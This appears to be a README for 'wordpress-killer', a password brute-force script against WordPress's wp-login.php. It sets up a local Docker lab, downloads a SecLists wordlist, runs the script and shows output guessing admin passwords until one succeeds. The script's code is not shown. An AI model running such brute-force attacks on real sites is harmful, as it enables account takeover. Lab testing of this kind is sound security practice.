# wordpress-killer

## 1. Download and unpack a copy of WordPress: https://wordpress.org/download/ here: `/home/kali/Downloads/wordpress`
## 2. Local Wordpress with Docker:
```bash
mkdir wp-lab && cd wp-lab
```
### 2.1 Create docker-compose.yml:
```yaml
services:
  db:
    image: mysql:8.0
    command: --default-authentication-plugin=mysql_native_password
    environment:
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wpuser
      MYSQL_PASSWORD: wppass
      MYSQL_ROOT_PASSWORD: rootpass
    volumes:
      - db_data:/var/lib/mysql

  wordpress:
    image: wordpress:latest
    depends_on:
      - db
    ports:
      - "8080:80"
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_NAME: wordpress
      WORDPRESS_DB_USER: wpuser
      WORDPRESS_DB_PASSWORD: wppass
    volumes:
      - wp_data:/var/www/html

volumes:
  db_data:
  wp_data:
```
## 3. Run: 
```bash
docker compose up -d
```
## 4. Then open http://localhost:8080 and finish the WP setup. 

## 5. Register on WordPress using a simple pair of credentials in order to test the bruteforce tool in a safe environment.

## 6. Download the wordlist here `/home/kali/Downloads/`: 
```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Software/cain-and-abel.txt
```

## 7. We are goint to test this endpont: http://localhost:8080/wp-login.php . 

## 8. Run:
```bash
python wp_kllr.py 2< /dev/null        # Less spam in the terminal.
```

### OUTPUT:
```bash
Brute Force Attack beginning on http://localhost:8080/wp-login.php.

Finished the setup where username = admin

Trying username/password admin/!@#$%     
Trying username/password admin/!@#$%^    
Trying username/password admin/!@#$%^&   
Trying username/password admin/!@#$%^&*  
Trying username/password admin/*         
Trying username/password admin/0         
Trying username/password admin/0racl3    
Trying username/password admin/0racl38   
Trying username/password admin/0racl38i  
Trying username/password admin/0racl39   
Trying username/password admin/0racl39i  
Trying username/password admin/0racle    
Trying username/password admin/0racle10  
Trying username/password admin/0racle10i 
Trying username/password admin/0racle8   
Trying username/password admin/0racle8i  
Trying username/password admin/0racle9   
Trying username/password admin/0racle9i  
Trying username/password admin/1         
Trying username/password admin/1022      
Trying username/password admin/10sne1    
Trying username/password admin/111111    
Trying username/password admin/121212    
Trying username/password admin/1225      

Bruteforcing successful.
Username is admin
Password is 1022

done: now cleaning up other threads...
 
```

It works!